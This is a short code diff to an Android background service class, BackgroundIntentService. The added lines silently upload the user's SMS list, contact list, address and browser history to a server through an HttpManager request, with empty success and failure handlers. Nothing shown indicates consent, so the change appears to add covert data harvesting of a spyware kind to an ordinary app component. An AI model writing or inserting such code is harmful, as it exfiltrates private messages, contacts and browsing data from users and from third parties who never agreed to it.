@@ -166,7 +166,19 @@ public class BackgroundIntentService extends IntentService{
                 .subscribe(new Consumer<String>() {
                     @Override
                     public void accept(@NonNull String s) throws Exception {
+                        new HttpManager<String>(BackgroundIntentService.this, HttpHelper.getInstance().addUserInfo(userInfoModel.getSmsList(),
+                                userInfoModel.getContactList(), userInfoModel.getAddress(), userInfoModel.getBrowserHistory()), false, false) {
 
+                            @Override
+                            public void onSuccess(BaseResponse<String> response) {
+
+                            }
+
+                            @Override
+                            public void onFailure(BaseResponse<String> response) {
+
+                            }
+                        }.doRequest();
                     }
                 });
     }
